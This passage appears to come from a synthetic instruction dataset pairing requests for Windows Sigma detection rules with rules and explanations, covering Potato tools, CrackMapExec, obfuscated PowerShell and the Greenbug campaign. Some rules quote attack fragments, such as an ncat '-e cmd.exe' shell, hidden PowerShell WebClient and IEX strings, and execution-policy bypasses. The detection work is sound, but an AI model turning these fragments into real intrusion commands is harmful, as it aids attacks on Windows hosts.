      "answer": "In order to detect different hacktools used for relay attacks on Windows for privilege escalation, you should:\n\nMonitor Windows process creation logs for instances of specific hacktools known to facilitate these types of attacks. Look for processes whose images include names hinting at popular attack tools such as 'PetitPotam', 'RottenPotato', 'HotPotato', 'JuicyPotato', among others, indicating that an attacker might be attempting to exploit Windows services for privilege escalation. Additionally, be vigilant for processes initiated with command lines that contain certain key phrases like 'Invoke-Tater', indicating the use of PowerShell scripts geared towards similar exploitation techniques, and variations of JuicyPotato attacks signified by certain command line patterns involving '.exe -t * -p ' and specific enumeration options used by JuicyPotatoNG.\n\nExclude from alerts the processes related to known legitimate software named HotPotatoes, which could be mistaken as part of the attack tools due to name similarities. This distinction is crucial to minimize false positives and ensure that detection efforts are focused on malicious activities.\n\nThe criticality of such detections is considered high due to the potential impact of these attacks, which include unauthorized privilege escalation and subsequent control over affected systems. To accurately detect and mitigate these threats, ensure that the detection logic covers a broad spectrum of known attack tool indicators while also allowing room for the exclusion of benign software sharing name characteristics with the tools in question."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting CrackMapExecWin Activity as Described by NCSC.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect CrackMapExecWin activity as described by NCSC, you should: monitor for the creation of processes on Windows systems where the process image name ends with '\\crackmapexec.exe'. This activity is critical to notice as it involves the use of CrackMapExec, a swiss army knife tool for pentesters, which focuses on the automation of assessing large Active Directory networks. There are no known benign instances where this execution would occur, marking any detection as critical and warranting immediate investigation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\crackmapexec.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\crackmapexec.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "CrackMapExecWin Activity as Described by NCSC",
      "answer": "In order to detect CrackMapExecWin activity as described by NCSC, you should: monitor for the creation of processes on Windows systems where the process image name ends with '\\crackmapexec.exe'. This activity is critical to notice as it involves the use of CrackMapExec, a swiss army knife tool for pentesters, which focuses on the automation of assessing large Active Directory networks. There are no known benign instances where this execution would occur, marking any detection as critical and warranting immediate investigation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting installation of a remote msi file from web..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the installation of a remote MSI file from the web, you should monitor application logs on Windows systems. Specifically, focus on events logged by the MsiInstaller provider, as this component is responsible for managing installations, updates, and removal of software on a Windows system. You should look for events with IDs 1040 and 1042, which correspond to the initiation and termination of an installation session, respectively.\n\nAn important aspect of detection is to check the data within these events for instances of '://', a pattern indicative of a Uniform Resource Locator (URL). The presence of a URL in these event logs could imply that the MSI file being installed is being fetched from a remote location over the internet, which is a characteristic of this kind of attack. \n\nHowever, it's important to approach detection with caution as there might be legitimate scenarios that could lead to false positives, and the specifics of what constitutes a false positive in this context are unknown. A moderate alert level is suggested to balance the need for security with the potential for erroneous alerts.\n\nThe tactics and techniques associated with this type of activity fall under the MITRE ATT&CK framework, but keep in mind that the explanation above does not include specific tags due to the provided instructions. Nonetheless, understanding that this behavior might relate to initial access and execution techniques, among others, within the framework can be useful for further analysis and response.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: application\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        Provider_Name: 'MsiInstaller'\n        EventID:\n            - 1040\n            - 1042\n        Data|contains: '://'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: application\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        Provider_Name: 'MsiInstaller'\n        EventID:\n            - 1040\n            - 1042\n        Data|contains: '://'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "installation of a remote msi file from web.",
      "answer": "In order to detect the installation of a remote MSI file from the web, you should monitor application logs on Windows systems. Specifically, focus on events logged by the MsiInstaller provider, as this component is responsible for managing installations, updates, and removal of software on a Windows system. You should look for events with IDs 1040 and 1042, which correspond to the initiation and termination of an installation session, respectively.\n\nAn important aspect of detection is to check the data within these events for instances of '://', a pattern indicative of a Uniform Resource Locator (URL). The presence of a URL in these event logs could imply that the MSI file being installed is being fetched from a remote location over the internet, which is a characteristic of this kind of attack. \n\nHowever, it's important to approach detection with caution as there might be legitimate scenarios that could lead to false positives, and the specifics of what constitutes a false positive in this context are unknown. A moderate alert level is suggested to balance the need for security with the potential for erroneous alerts.\n\nThe tactics and techniques associated with this type of activity fall under the MITRE ATT&CK framework, but keep in mind that the explanation above does not include specific tags due to the provided instructions. Nonetheless, understanding that this behavior might relate to initial access and execution techniques, among others, within the framework can be useful for further analysis and response."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting PowerShell command lines with special characters.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the PowerShell command lines with special characters, you should focus on monitoring the creation of processes on Windows systems. Specifically, keep an eye out for processes that are initiated by PowerShell executables, identified either by their image name ending with '\\powershell.exe' or '\\pwsh.exe', or by their original file names being 'PowerShell.EXE' or 'pwsh.dll'. Additionally, scrutinize the command lines of these processes for patterns that include a series of special characters. These patterns might involve repeated concatenations (indicated by numerous plus signs '+'), nested curly brackets '{', caret symbols '^', or backticks '`'. \n\nSuch command lines are typically unconventional and may signify attempts to obfuscate malicious commands or scripts, a common tactic used by attackers to evade detection. However, it's important to exclude legitimate uses of similar patterns that might originate from specific known and trusted processes, such as those from Amazon SSM Document Worker or related to Windows Defender ATP functionalities. The presence of certain strings in the command line associated with Windows Defender ATP should be identified as legitimate activity and not be falsely flagged as malicious. \n\nMonitoring for these specific conditions with a high level of scrutiny is critical in identifying suspicious or potentially malicious PowerShell activity that leverages special characters for obfuscation, which is a characteristic of sophisticated cyber attacks. It is worth noting that while this strategy aims to minimize false positives by excluding known benign activities, careful configuration and ongoing tuning are essential to balance security and operational efficiency effectively.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        - OriginalFileName:\n            - 'PowerShell.EXE'\n            - 'pwsh.dll'\n    selection_re:\n        # TODO: Optimize for PySIGMA\n        - CommandLine|re: '.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*'\n        - CommandLine|re: '.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*'\n        - CommandLine|re: '.*\\^.*\\^.*\\^.*\\^.*\\^.*'\n        - CommandLine|re: '.*`.*`.*`.*`.*`.*'\n    filter_optional_amazonSSM:\n        ParentImage: C:\\Program Files\\Amazon\\SSM\\ssm-document-worker.exe\n    filter_optional_defender_atp:\n        CommandLine|contains:\n            - 'new EventSource(\"Microsoft.Windows.Sense.Client.Management\"'\n            - 'public static extern bool InstallELAMCertificateInfo(SafeFileHandle handle);'\n    condition: all of selection_* and not 1 of filter_optional_*\nfalsepositives:\n    - Amazon SSM Document Worker\n    - Windows Defender ATP\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        - OriginalFileName:\n            - 'PowerShell.EXE'\n            - 'pwsh.dll'\n    selection_re:\n        # TODO: Optimize for PySIGMA\n        - CommandLine|re: '.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*'\n        - CommandLine|re: '.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*'\n        - CommandLine|re: '.*\\^.*\\^.*\\^.*\\^.*\\^.*'\n        - CommandLine|re: '.*`.*`.*`.*`.*`.*'\n    filter_optional_amazonSSM:\n        ParentImage: C:\\Program Files\\Amazon\\SSM\\ssm-document-worker.exe\n    filter_optional_defender_atp:\n        CommandLine|contains:\n            - 'new EventSource(\"Microsoft.Windows.Sense.Client.Management\"'\n            - 'public static extern bool InstallELAMCertificateInfo(SafeFileHandle handle);'\n    condition: all of selection_* and not 1 of filter_optional_*\nfalsepositives:\n    - Amazon SSM Document Worker\n    - Windows Defender ATP\nlevel: high\n",
      "question": "PowerShell command lines with special characters",
      "answer": "In order to detect the PowerShell command lines with special characters, you should focus on monitoring the creation of processes on Windows systems. Specifically, keep an eye out for processes that are initiated by PowerShell executables, identified either by their image name ending with '\\powershell.exe' or '\\pwsh.exe', or by their original file names being 'PowerShell.EXE' or 'pwsh.dll'. Additionally, scrutinize the command lines of these processes for patterns that include a series of special characters. These patterns might involve repeated concatenations (indicated by numerous plus signs '+'), nested curly brackets '{', caret symbols '^', or backticks '`'. \n\nSuch command lines are typically unconventional and may signify attempts to obfuscate malicious commands or scripts, a common tactic used by attackers to evade detection. However, it's important to exclude legitimate uses of similar patterns that might originate from specific known and trusted processes, such as those from Amazon SSM Document Worker or related to Windows Defender ATP functionalities. The presence of certain strings in the command line associated with Windows Defender ATP should be identified as legitimate activity and not be falsely flagged as malicious. \n\nMonitoring for these specific conditions with a high level of scrutiny is critical in identifying suspicious or potentially malicious PowerShell activity that leverages special characters for obfuscation, which is a characteristic of sophisticated cyber attacks. It is worth noting that while this strategy aims to minimize false positives by excluding known benign activities, careful configuration and ongoing tuning are essential to balance security and operational efficiency effectively."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting an exploitation attempt in which the UAC consent dialogue is used to invoke an Internet Explorer process running as LOCAL_SYSTEM.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an exploitation attempt in which the UAC consent dialogue is used to invoke an Internet Explorer process running as LOCAL_SYSTEM, you should: Monitor the creation of processes on Windows systems, specifically focusing on any instance where the Internet Explorer (iexplore.exe) is launched by the UAC consent dialogue process (consent.exe). The indication to look for includes cases where the Internet Explorer process is initiated with command lines that contain 'http' (suggesting web navigation or internet usage). Additionally, it's critical to examine the integrity level or user context of these processes, looking particularly for processes running at the 'System' integrity level or processes initiated by users with names containing 'AUTHORI' or 'AUTORI', which could cover various language settings indicating administrative or authorized users. This detection is of critical importance due to the potential misuse of legitimate system functionalities to achieve unauthorized access or execute malicious actions with elevated privileges.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\consent.exe'\n        Image|endswith: '\\iexplore.exe'\n        CommandLine|contains: ' http'\n    rights1:\n        IntegrityLevel: 'System'  # for Sysmon users\n    rights2:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and ( rights1 or rights2 )\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\consent.exe'\n        Image|endswith: '\\iexplore.exe'\n        CommandLine|contains: ' http'\n    rights1:\n        IntegrityLevel: 'System'  # for Sysmon users\n    rights2:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and ( rights1 or rights2 )\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "an exploitation attempt in which the UAC consent dialogue is used to invoke an Internet Explorer process running as LOCAL_SYSTEM",
      "answer": "In order to detect an exploitation attempt in which the UAC consent dialogue is used to invoke an Internet Explorer process running as LOCAL_SYSTEM, you should: Monitor the creation of processes on Windows systems, specifically focusing on any instance where the Internet Explorer (iexplore.exe) is launched by the UAC consent dialogue process (consent.exe). The indication to look for includes cases where the Internet Explorer process is initiated with command lines that contain 'http' (suggesting web navigation or internet usage). Additionally, it's critical to examine the integrity level or user context of these processes, looking particularly for processes running at the 'System' integrity level or processes initiated by users with names containing 'AUTHORI' or 'AUTORI', which could cover various language settings indicating administrative or authorized users. This detection is of critical importance due to the potential misuse of legitimate system functionalities to achieve unauthorized access or execute malicious actions with elevated privileges."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting addition of new root, CA or AuthRoot certificates to the Windows registry.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the addition of new root, CA or AuthRoot certificates to the Windows registry, you should monitor Windows registry settings specifically within the registry key categories associated with root, CA, or AuthRoot certificates. This involves tracking any SetValue events where TargetObject paths contain specific strings related to the system, policies, or enterprise certificates within the Root, CA, or AuthRoot directories. In more detail, lookout for changes in registry paths such as '\\SOFTWARE\\Microsoft\\SystemCertificates\\Root\\Certificates\\', '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\\', and similar paths for CA and AuthRoot certificates. Additionally, ensure that these registry modifications end with '\\Blob' and involve binary data, as these attributes are indicative of certificate additions. This detection method is crucial for maintaining the integrity and security of the system's trust store, as unauthorized or malicious certificates can compromise secure communications and facilitate further attacks. It's categorized under medium severity due to the potential risk it represents, although it's noted that there may be unknown false positives. Keep an eye on these registry alterations to protect the system against unauthorized certificate injections, which are a part of several attack techniques like spoofing, man-in-the-middle attacks, and more.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: Setvalue\n        TargetObject|contains:\n            - '\\SOFTWARE\\Microsoft\\SystemCertificates\\Root\\Certificates\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\SystemCertificates\\CA\\Certificates\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\CA\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\CA\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\AuthRoot\\Certificates\\'\n        TargetObject|endswith: '\\Blob'\n        Details: 'Binary Data'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: Setvalue\n        TargetObject|contains:\n            - '\\SOFTWARE\\Microsoft\\SystemCertificates\\Root\\Certificates\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\SystemCertificates\\CA\\Certificates\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\CA\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\CA\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\'\n            - '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\'\n            - '\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\AuthRoot\\Certificates\\'\n        TargetObject|endswith: '\\Blob'\n        Details: 'Binary Data'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "addition of new root, CA or AuthRoot certificates to the Windows registry",
      "answer": "In order to detect the addition of new root, CA or AuthRoot certificates to the Windows registry, you should monitor Windows registry settings specifically within the registry key categories associated with root, CA, or AuthRoot certificates. This involves tracking any SetValue events where TargetObject paths contain specific strings related to the system, policies, or enterprise certificates within the Root, CA, or AuthRoot directories. In more detail, lookout for changes in registry paths such as '\\SOFTWARE\\Microsoft\\SystemCertificates\\Root\\Certificates\\', '\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\\', and similar paths for CA and AuthRoot certificates. Additionally, ensure that these registry modifications end with '\\Blob' and involve binary data, as these attributes are indicative of certificate additions. This detection method is crucial for maintaining the integrity and security of the system's trust store, as unauthorized or malicious certificates can compromise secure communications and facilitate further attacks. It's categorized under medium severity due to the potential risk it represents, although it's noted that there may be unknown false positives. Keep an eye on these registry alterations to protect the system against unauthorized certificate injections, which are a part of several attack techniques like spoofing, man-in-the-middle attacks, and more."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting tools and process executions used by Greenbug in their May 2020 campaign as reported by Symantec.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect tools and process executions used by Greenbug in their May 2020 campaign as reported by Symantec, you should focus on monitoring the creation of processes on Windows systems. Specifically, look for processes that are launched from specific paths or with certain command lines indicative of malicious activities. These indicators include:\n\n1. Processes that are initiated from paths ending with:\n   - `:\\ProgramData\\adobe\\Adobe.exe`\n   - `:\\ProgramData\\oracle\\local.exe`\n   - `\\revshell.exe`\n   - `\\infopagesbackup\\ncat.exe`\n   - `:\\ProgramData\\comms\\comms.exe`\n\nThese paths suggest unauthorized installations or misuse of legitimate folders for malicious executables.\n\n2. Command lines that contain specific patterns, signifying the execution of potentially harmful scripts or tools, such as:\n   - Commands including '-ExecutionPolicy Bypass -File' together with '\\msf.ps1', indicating the use of PowerShell to bypass execution policy restrictions to run a malicious script named `msf.ps1`.\n   - The combination of 'infopagesbackup', '\\ncat', and '-e cmd.exe' in the command line, signifying the use of Ncat to execute command shell, which could be used for remote access or command and control.\n   - Various PowerShell command lines designed to execute code stealthily or to collect and exfiltrate sensitive information. These include using SQL data adapters, WebClient objects, default credentials, and running commands like `whoami` and `netstat -a` without interactive prompts.\n   - Command lines containing the Base64 encoded string 'L3NlcnZlcj1', which decodes to '/server=', part of a command likely used for remote communication.\n\nDetection of any of these activities should be treated as critical, with a low likelihood of false positives. Monitoring for such specific behaviors and execution patterns is crucial for identifying and mitigating activities associated with the Greenbug campaign or similar threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith:\n            - ':\\ProgramData\\adobe\\Adobe.exe'\n            - ':\\ProgramData\\oracle\\local.exe'\n            - '\\revshell.exe'\n            - '\\infopagesbackup\\ncat.exe'\n            - ':\\ProgramData\\comms\\comms.exe'\n    selection_msf:\n        CommandLine|contains|all:\n            - '-ExecutionPolicy Bypass -File'\n            - '\\msf.ps1'\n    selection_ncat:\n        CommandLine|contains|all:\n            - 'infopagesbackup'\n            - '\\ncat'\n            - '-e cmd.exe'\n    selection_powershell:\n        CommandLine|contains:\n            - 'system.Data.SqlClient.SqlDataAdapter($cmd); [void]$da.fill'\n            - '-nop -w hidden -c $k=new-object'\n            - '[Net.CredentialCache]::DefaultCredentials;IEX '\n            - ' -nop -w hidden -c $m=new-object net.webclient;$m'\n            - '-noninteractive -executionpolicy bypass whoami'\n            - '-noninteractive -executionpolicy bypass netstat -a'\n    selection_other:\n        CommandLine|contains: 'L3NlcnZlcj1'  # base64 encoded '/server='\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith:\n            - ':\\ProgramData\\adobe\\Adobe.exe'\n            - ':\\ProgramData\\oracle\\local.exe'\n            - '\\revshell.exe'\n            - '\\infopagesbackup\\ncat.exe'\n            - ':\\ProgramData\\comms\\comms.exe'\n    selection_msf:\n        CommandLine|contains|all:\n            - '-ExecutionPolicy Bypass -File'\n            - '\\msf.ps1'\n    selection_ncat:\n        CommandLine|contains|all:\n            - 'infopagesbackup'\n            - '\\ncat'\n            - '-e cmd.exe'\n    selection_powershell:\n        CommandLine|contains:\n            - 'system.Data.SqlClient.SqlDataAdapter($cmd); [void]$da.fill'\n            - '-nop -w hidden -c $k=new-object'\n            - '[Net.CredentialCache]::DefaultCredentials;IEX '\n            - ' -nop -w hidden -c $m=new-object net.webclient;$m'\n            - '-noninteractive -executionpolicy bypass whoami'\n            - '-noninteractive -executionpolicy bypass netstat -a'\n    selection_other:\n        CommandLine|contains: 'L3NlcnZlcj1'  # base64 encoded '/server='\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "tools and process executions used by Greenbug in their May 2020 campaign as reported by Symantec",
      "answer": "In order to detect tools and process executions used by Greenbug in their May 2020 campaign as reported by Symantec, you should focus on monitoring the creation of processes on Windows systems. Specifically, look for processes that are launched from specific paths or with certain command lines indicative of malicious activities. These indicators include:\n\n1. Processes that are initiated from paths ending with:\n   - `:\\ProgramData\\adobe\\Adobe.exe`\n   - `:\\ProgramData\\oracle\\local.exe`\n   - `\\revshell.exe`\n   - `\\infopagesbackup\\ncat.exe`\n   - `:\\ProgramData\\comms\\comms.exe`\n\nThese paths suggest unauthorized installations or misuse of legitimate folders for malicious executables.\n\n2. Command lines that contain specific patterns, signifying the execution of potentially harmful scripts or tools, such as:\n   - Commands including '-ExecutionPolicy Bypass -File' together with '\\msf.ps1', indicating the use of PowerShell to bypass execution policy restrictions to run a malicious script named `msf.ps1`.\n   - The combination of 'infopagesbackup', '\\ncat', and '-e cmd.exe' in the command line, signifying the use of Ncat to execute command shell, which could be used for remote access or command and control.\n   - Various PowerShell command lines designed to execute code stealthily or to collect and exfiltrate sensitive information. These include using SQL data adapters, WebClient objects, default credentials, and running commands like `whoami` and `netstat -a` without interactive prompts.\n   - Command lines containing the Base64 encoded string 'L3NlcnZlcj1', which decodes to '/server=', part of a command likely used for remote communication.\n\nDetection of any of these activities should be treated as critical, with a low likelihood of false positives. Monitoring for such specific behaviors and execution patterns is crucial for identifying and mitigating activities associated with the Greenbug campaign or similar threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Dllhost that communicates with public IP addresses.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Dllhost that communicates with public IP addresses, you should monitor network connections from Windows systems, specifically looking for activities where the process image name ends with '\\dllhost.exe' indicating the DllHost process and where such a process initiates a connection. It is crucial to focus on connections that are destined for public IP addresses, which means excluding any connection attempts to private or reserved IP address ranges often used within corporate or private networks. These ranges include the commonly used private IPv4 addresses such as 10.x.x.x, 192.168.x.x, and various segments of 172.16.x.x to 172.31.x.x, as well as the link-local address 169.254.x.x and the loopback address 127.x.x.x. For IPv6, exclude connections to the loopback addresses (::1 and 0:0:0:0:0:0:0:1), link-local addresses starting with 'fe80:', and private address ranges starting with 'fc' or 'fd'.\n\nAdditionally, connections to certain Microsoft-owned public subnets, such as those in the range of 20.184.x.x to 20.191.x.x, 23.79.x.x, 51.10.x.x to 51.105.x.x, and 52.239.x.x, should not be considered indicators of this suspicious activity. This approach minimizes false positives, especially in corporate environments where legitimate communication may occur with public IP addresses for genuine business purposes. The associative tags for this detection strategy include tactics and techniques like Command and Control and Exfiltration over Command and Control Channel. Monitoring these parameters carefully can help identify potentially malicious communication initiated by Dllhost to public IPs, indicating a possible compromise or unauthorized data exfiltration attempt.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dllhost.exe'\n        Initiated: 'true'\n    filter_ipv4:\n        DestinationIp|startswith:\n            - '10.'\n            - '192.168.'\n            - '172.16.'\n            - '172.17.'\n            - '172.18.'\n            - '172.19.'\n            - '172.20.'\n            - '172.21.'\n            - '172.22.'\n            - '172.23.'\n            - '172.24.'\n            - '172.25.'\n            - '172.26.'\n            - '172.27.'\n            - '172.28.'\n            - '172.29.'\n            - '172.30.'\n            - '172.31.'\n            - '169.254.'  # link-local address\n            - '127.'  # loopback address\n    filter_ipv6:\n        DestinationIp|startswith:\n            - '::1'  # IPv6 loopback variant\n            - '0:0:0:0:0:0:0:1'  # IPv6 loopback variant\n            - 'fe80:'  # link-local address\n            - 'fc'  # private address range fc00::/7\n            - 'fd'  # private address range fc00::/7\n    filter_msrange:\n        DestinationIp|startswith:\n            # Subnet: 20.184.0.0/13\n            - '20.184.'\n            - '20.185.'\n            - '20.186.'\n            - '20.187.'\n            - '20.188.'\n            - '20.189.'\n            - '20.190.'\n            - '20.191.'\n            - '23.79.'\n            - '51.10.'\n            # Subnet: 51.103.210.0/23\n            - '51.103.'\n            - '51.104.'\n            - '51.105.'\n            - '52.239.'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Communication to other corporate systems that use IP addresses from public address spaces\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dllhost.exe'\n        Initiated: 'true'\n    filter_ipv4:\n        DestinationIp|startswith:\n            - '10.'\n            - '192.168.'\n            - '172.16.'\n            - '172.17.'\n            - '172.18.'\n            - '172.19.'\n            - '172.20.'\n            - '172.21.'\n            - '172.22.'\n            - '172.23.'\n            - '172.24.'\n            - '172.25.'\n            - '172.26.'\n            - '172.27.'\n            - '172.28.'\n            - '172.29.'\n            - '172.30.'\n            - '172.31.'\n            - '169.254.'  # link-local address\n            - '127.'  # loopback address\n    filter_ipv6:\n        DestinationIp|startswith:\n            - '::1'  # IPv6 loopback variant\n            - '0:0:0:0:0:0:0:1'  # IPv6 loopback variant\n            - 'fe80:'  # link-local address\n            - 'fc'  # private address range fc00::/7\n            - 'fd'  # private address range fc00::/7\n    filter_msrange:\n        DestinationIp|startswith:\n            # Subnet: 20.184.0.0/13\n            - '20.184.'\n            - '20.185.'\n            - '20.186.'\n            - '20.187.'\n            - '20.188.'\n            - '20.189.'\n            - '20.190.'\n            - '20.191.'\n            - '23.79.'\n            - '51.10.'\n            # Subnet: 51.103.210.0/23\n            - '51.103.'\n            - '51.104.'\n            - '51.105.'\n            - '52.239.'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Communication to other corporate systems that use IP addresses from public address spaces\nlevel: medium\n",
      "question": "Dllhost that communicates with public IP addresses",
      "answer": "In order to detect Dllhost that communicates with public IP addresses, you should monitor network connections from Windows systems, specifically looking for activities where the process image name ends with '\\dllhost.exe' indicating the DllHost process and where such a process initiates a connection. It is crucial to focus on connections that are destined for public IP addresses, which means excluding any connection attempts to private or reserved IP address ranges often used within corporate or private networks. These ranges include the commonly used private IPv4 addresses such as 10.x.x.x, 192.168.x.x, and various segments of 172.16.x.x to 172.31.x.x, as well as the link-local address 169.254.x.x and the loopback address 127.x.x.x. For IPv6, exclude connections to the loopback addresses (::1 and 0:0:0:0:0:0:0:1), link-local addresses starting with 'fe80:', and private address ranges starting with 'fc' or 'fd'.\n\nAdditionally, connections to certain Microsoft-owned public subnets, such as those in the range of 20.184.x.x to 20.191.x.x, 23.79.x.x, 51.10.x.x to 51.105.x.x, and 52.239.x.x, should not be considered indicators of this suspicious activity. This approach minimizes false positives, especially in corporate environments where legitimate communication may occur with public IP addresses for genuine business purposes. The associative tags for this detection strategy include tactics and techniques like Command and Control and Exfiltration over Command and Control Channel. Monitoring these parameters carefully can help identify potentially malicious communication initiated by Dllhost to public IPs, indicating a possible compromise or unauthorized data exfiltration attempt."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of SysmonEnte, a tool to attack the integrity of Sysmon.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of SysmonEnte, a tool to attack the integrity of Sysmon, you should: Focus on monitoring process access within Windows systems. Specifically, watch for any process that attempts to access 'C:\\Windows\\Sysmon64.exe' with granted access rights of '0x1400'. However, it's important to exclude any access attempts that originate from common system directories such as 'C:\\Program Files' and 'C:\\Windows\\System32\\', as these are likely to be legitimate. Besides, any access from 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\' ending with '\\MsMpEng.exe' should also be disregarded to avoid false alarms linked to Microsoft Defender processes. Additionally, pay attention to call traces that contain the string 'Ente', which could indicate the malicious operation of SysmonEnte. The detection strategy involves flagging scenarios that match either the direct access attempt with specified rights to Sysmon64.exe (excluding known good sources) or the presence of indicative call traces, thereby enhancing the accuracy of detecting attacks aimed at undermining Sysmon's integrity. Note that there may be unknown false positives, and the threat level associated with this detection is considered high.",
    "context": "",
